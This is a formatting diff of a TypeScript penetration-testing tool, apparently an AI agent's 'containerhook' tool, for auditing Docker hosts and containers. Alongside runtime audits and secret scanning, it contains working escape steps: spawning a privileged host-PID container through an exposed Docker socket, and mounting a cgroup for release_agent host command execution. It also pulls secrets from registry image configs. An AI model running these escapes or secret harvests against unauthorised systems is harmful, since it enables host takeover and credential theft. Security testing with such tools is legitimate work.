@@ -40,12 +40,25 @@ const PROGRAMS = {
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
-type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
+type Finding = {
+  checkId: string
+  provider: string
+  severity: string
+  status: string
+  resource: string
+  title: string
+  details: string
+  remediation: string
+}
 type HookResult = { output: string; findings: Finding[] }
 
 // ── CLI helpers ──
 
-async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+async function run(
+  cmd: string,
+  args: string[],
+  timeout: number,
+): Promise<{ stdout: string; stderr: string; exitCode: number }> {
   const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
   const timer = setTimeout(() => proc.kill(), timeout * 1000)
   const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
@@ -63,7 +76,11 @@ function hasFlag(args: string[], flag: string): boolean {
 }
 
 function tryJson(s: string) {
-  try { return JSON.parse(s) } catch { return null }
+  try {
+    return JSON.parse(s)
+  } catch {
+    return null
+  }
 }
 
 function docker(args: string[], socket: string | undefined, host: string | undefined, timeout: number) {
@@ -91,7 +108,9 @@ async function dockerEnum(args: string[], timeout: number): Promise<HookResult> 
       output.push(`    Root dir: ${d.DockerRootDir}`)
       output.push(`    Security: ${(d.SecurityOptions || []).join(", ")}`)
       if (d.RegistryConfig?.InsecureRegistryCIDRs?.length > 1 || d.RegistryConfig?.IndexConfigs) {
-        const insecure = Object.entries(d.RegistryConfig?.IndexConfigs || {}).filter(([, v]: [string, any]) => !v.Secure).map(([k]) => k)
+        const insecure = Object.entries(d.RegistryConfig?.IndexConfigs || {})
+          .filter(([, v]: [string, any]) => !v.Secure)
+          .map(([k]) => k)
         if (insecure.length > 0) {
           findings.push({
             checkId: "CONT-ENUM-001",
@@ -182,7 +201,23 @@ async function dockerEscape(args: string[], timeout: number): Promise<HookResult
         })
         if (exploit && (!method || method === "socket")) {
           output.push(`[!] Exploiting socket escape...`)
-          const id = await run("docker", ["-H", `unix://${p}`, "run", "-d", "--privileged", "--pid=host", "--label", "cyberstrike=true", "alpine", "sleep", "3600"], timeout)
+          const id = await run(
+            "docker",
+            [
+              "-H",
+              `unix://${p}`,
+              "run",
+              "-d",
+              "--privileged",
+              "--pid=host",
+              "--label",
+              "cyberstrike=true",
+              "alpine",
+              "sleep",
+              "3600",
+            ],
+            timeout,
+          )
           if (id.exitCode === 0) output.push(`[+] Privileged container spawned: ${id.stdout.trim().substring(0, 12)}`)
         }
       }
@@ -227,7 +262,8 @@ async function dockerEscape(args: string[], timeout: number): Promise<HookResult
       const d = "/tmp/cs-cgroup"
       await run("mkdir", ["-p", d], 5)
       const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
-      if (mount.exitCode === 0) output.push(`[+] Cgroup mounted at ${d} — write release_agent for host command execution`)
+      if (mount.exitCode === 0)
+        output.push(`[+] Cgroup mounted at ${d} — write release_agent for host command execution`)
       if (mount.exitCode !== 0) output.push(`[!] Cgroup mount failed (expected if not privileged)`)
     }
   }
@@ -279,7 +315,8 @@ async function imageScan(args: string[], timeout: number): Promise<HookResult> {
       const config = data[0].Config || {}
       const env = config.Env || []
       output.push(`\n[+] Environment variables: ${env.length}`)
-      const secretPatterns = /(?:password|secret|api.?key|token|credential|aws|private.?key|database.?url|connection.?string)/i
+      const secretPatterns =
+        /(?:password|secret|api.?key|token|credential|aws|private.?key|database.?url|connection.?string)/i
       for (const e of env) {
         if (secretPatterns.test(e)) {
           output.push(`    [!] ${e.substring(0, 200)}`)
@@ -336,9 +373,10 @@ async function registryDump(args: string[], timeout: number): Promise<HookResult
 
   output.push(`[*] Enumerating registry: ${registry}\n`)
 
-  const authHeader = username && password
-    ? ["-H", `Authorization: Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`]
-    : []
+  const authHeader =
+    username && password
+      ? ["-H", `Authorization: Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`]
+      : []
 
   const catalog = await run("curl", ["-sk", `${registry}/v2/_catalog`, ...authHeader, "--max-time", "30"], timeout)
   if (catalog.exitCode === 0) {
@@ -358,17 +396,39 @@ async function registryDump(args: string[], timeout: number): Promise<HookResult
         })
       }
       for (const repo of data.repositories.slice(0, 30)) {
-        const tags = await run("curl", ["-sk", `${registry}/v2/${repo}/tags/list`, ...authHeader, "--max-time", "10"], timeout)
+        const tags = await run(
+          "curl",
+          ["-sk", `${registry}/v2/${repo}/tags/list`, ...authHeader, "--max-time", "10"],
+          timeout,
+        )
         const tagData = tryJson(tags.stdout)
         const tagList = tagData?.tags || []
-        output.push(`    ${repo}: ${tagList.length} tags — ${tagList.slice(0, 5).join(", ")}${tagList.length > 5 ? "..." : ""}`)
+        output.push(
+          `    ${repo}: ${tagList.length} tags — ${tagList.slice(0, 5).join(", ")}${tagList.length > 5 ? "..." : ""}`,
+        )
 
         if (tagList.length > 0) {
           const tag = tagList[0]
-          const manifest = await run("curl", ["-sk", `${registry}/v2/${repo}/manifests/${tag}`, "-H", "Accept: application/vnd.docker.distribution.manifest.v2+json", ...authHeader, "--max-time", "10"], timeout)
+          const manifest = await run(
+            "curl",
+            [
+              "-sk",
+              `${registry}/v2/${repo}/manifests/${tag}`,
+              "-H",
+              "Accept: application/vnd.docker.distribution.manifest.v2+json",
+              ...authHeader,
+              "--max-time",
+              "10",
+            ],
+            timeout,
+          )
           const mData = tryJson(manifest.stdout)
           if (mData?.config?.digest) {
-            const blob = await run("curl", ["-sk", `${registry}/v2/${repo}/blobs/${mData.config.digest}`, ...authHeader, "--max-time", "15"], timeout)
+            const blob = await run(
+              "curl",
+              ["-sk", `${registry}/v2/${repo}/blobs/${mData.config.digest}`, ...authHeader, "--max-time", "15"],
+              timeout,
+            )
             const config = tryJson(blob.stdout)
             if (config?.config?.Env) {
               const secretPatterns = /(?:password|secret|api.?key|token|credential|aws)/i
@@ -431,7 +491,16 @@ async function runtimeAudit(args: string[], timeout: number): Promise<HookResult
     const hc = c.HostConfig || {}
     if (hc.Privileged) {
       output.push(`  [!] PRIVILEGED MODE`)
-      findings.push({ checkId: "CONT-RT-001", provider: "docker", severity: "critical", status: "FAIL", resource: `container://${name}`, title: `Privileged container: ${name}`, details: "Container has full host access", remediation: "Remove --privileged flag" })
+      findings.push({
+        checkId: "CONT-RT-001",
+        provider: "docker",
+        severity: "critical",
+        status: "FAIL",
+        resource: `container://${name}`,
+        title: `Privileged container: ${name}`,
+        details: "Container has full host access",
+        remediation: "Remove --privileged flag",
+      })
     }
     if (hc.PidMode === "host") output.push(`  [!] Host PID namespace`)
     if (hc.NetworkMode === "host") output.push(`  [!] Host network namespace`)
@@ -442,7 +511,16 @@ async function runtimeAudit(args: string[], timeout: number): Promise<HookResult
     const capDrop = hc.CapDrop || []
     output.push(`  Capabilities dropped: ${capDrop.length > 0 ? capDrop.join(", ") : "NONE"}`)
     if (capDrop.length === 0 && !hc.Privileged) {
-      findings.push({ checkId: "CONT-RT-002", provider: "docker", severity: "medium", status: "FAIL", resource: `container://${name}`, title: `No capabilities dropped: ${name}`, details: "Container retains all default capabilities", remediation: "Add --cap-drop ALL and only --cap-add required capabilities" })
+      findings.push({
+        checkId: "CONT-RT-002",
+        provider: "docker",
+        severity: "medium",
+        status: "FAIL",
+        resource: `container://${name}`,
+        title: `No capabilities dropped: ${name}`,
+        details: "Container retains all default capabilities",
+        remediation: "Add --cap-drop ALL and only --cap-add required capabilities",
+      })
     }
 
     output.push(`  AppArmor: ${hc.AppArmorProfile || "unconfined"}`)
@@ -458,7 +536,16 @@ async function runtimeAudit(args: string[], timeout: number): Promise<HookResult
         const sensitive = m.Source?.match(/\/(etc|root|var\/run|proc|sys|boot)/)
         output.push(`    ${m.Source} → ${m.Destination} (${m.Mode || "rw"})${sensitive ? " [SENSITIVE]" : ""}`)
         if (sensitive) {
-          findings.push({ checkId: "CONT-RT-003", provider: "docker", severity: "high", status: "FAIL", resource: `container://${name}`, title: `Sensitive host path mounted: ${m.Source}`, details: `${m.Source} → ${m.Destination} (${m.Mode || "rw"})`, remediation: "Remove sensitive host path mounts" })
+          findings.push({
+            checkId: "CONT-RT-003",
+            provider: "docker",
+            severity: "high",
+            status: "FAIL",
+            resource: `container://${name}`,
+            title: `Sensitive host path mounted: ${m.Source}`,
+            details: `${m.Source} → ${m.Destination} (${m.Mode || "rw"})`,
+            remediation: "Remove sensitive host path mounts",
+          })
         }
       }
     }
@@ -466,7 +553,16 @@ async function runtimeAudit(args: string[], timeout: number): Promise<HookResult
     const limits = hc.Memory || hc.NanoCpus || hc.PidsLimit
     output.push(`  Resource limits: ${limits ? "configured" : "NONE"}`)
     if (!limits) {
-      findings.push({ checkId: "CONT-RT-004", provider: "docker", severity: "low", status: "FAIL", resource: `container://${name}`, title: `No resource limits: ${name}`, details: "Container has no memory/CPU/PID limits — DoS risk", remediation: "Set --memory, --cpus, and --pids-limit" })
+      findings.push({
+        checkId: "CONT-RT-004",
+        provider: "docker",
+        severity: "low",
+        status: "FAIL",
+        resource: `container://${name}`,
+        title: `No resource limits: ${name}`,
+        details: "Container has no memory/CPU/PID limits — DoS risk",
+        remediation: "Set --memory, --cpus, and --pids-limit",
+      })
     }
   }
 
@@ -478,9 +574,29 @@ async function composeSecrets(args: string[], timeout: number): Promise<HookResu
   const findings: Finding[] = []
   const output: string[] = [`[*] Scanning for container secrets in: ${searchPath}\n`]
 
-  const secretPatterns = /(?:password|secret|api[_-]?key|token|credential|aws[_-]?access|private[_-]?key|database[_-]?url|connection[_-]?string|mysql|postgres|redis|mongo)[\s]*[=:]/i
+  const secretPatterns =
+    /(?:password|secret|api[_-]?key|token|credential|aws[_-]?access|private[_-]?key|database[_-]?url|connection[_-]?string|mysql|postgres|redis|mongo)[\s]*[=:]/i
 
-  const composeFiles = await run("find", [searchPath, "-maxdepth", "3", "-name", "docker-compose*.yml", "-o", "-name", "docker-compose*.yaml", "-o", "-name", "compose.yml", "-o", "-name", "compose.yaml"], timeout)
+  const composeFiles = await run(
+    "find",
+    [
+      searchPath,
+      "-maxdepth",
+      "3",
+      "-name",
+      "docker-compose*.yml",
+      "-o",
+      "-name",
+      "docker-compose*.yaml",
+      "-o",
+      "-name",
+      "compose.yml",
+      "-o",
+      "-name",
+      "compose.yaml",
+    ],
+    timeout,
+  )
   if (composeFiles.exitCode === 0) {
     const files = composeFiles.stdout.trim().split("\n").filter(Boolean)
     output.push(`[+] Compose files: ${files.length}`)
@@ -506,7 +622,11 @@ async function composeSecrets(args: string[], timeout: number): Promise<HookResu
     }
   }
 
-  const envFiles = await run("find", [searchPath, "-maxdepth", "3", "-name", ".env", "-o", "-name", ".env.*", "-o", "-name", "*.env"], timeout)
+  const envFiles = await run(
+    "find",
+    [searchPath, "-maxdepth", "3", "-name", ".env", "-o", "-name", ".env.*", "-o", "-name", "*.env"],
+    timeout,
+  )
   if (envFiles.exitCode === 0) {
     const files = envFiles.stdout.trim().split("\n").filter(Boolean)
     output.push(`\n[+] Environment files: ${files.length}`)
@@ -659,7 +779,11 @@ export const ContainerhookTool = Tool.define("containerhook", {
         metadata: { program: params.program, findings: result.findings },
       }
     } catch (e) {
-      return { title: `containerhook: ${params.program}`, output: `Error: ${e instanceof Error ? e.message : String(e)}`, metadata: { program: params.program, findings: [] } }
+      return {
+        title: `containerhook: ${params.program}`,
+        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
+        metadata: { program: params.program, findings: [] },
+      }
     }
   },
 })
